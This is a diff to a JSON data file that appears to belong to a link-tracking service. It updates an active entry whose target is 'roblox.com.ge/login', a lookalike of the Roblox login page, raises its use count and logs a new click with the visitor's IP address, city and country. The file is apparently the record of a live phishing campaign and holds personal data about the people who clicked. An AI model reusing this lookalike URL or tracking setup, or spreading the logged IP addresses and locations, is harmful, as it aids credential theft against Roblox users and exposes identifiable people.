@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1380,
+    "useCount": 1381,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11206,6 +11206,14 @@
         "ip": "76.98.79.85",
         "country": "United States",
         "city": "Oaklyn",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777423559285,
+        "ip": "47.156.58.76",
+        "country": "United States",
+        "city": "San Jacinto",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
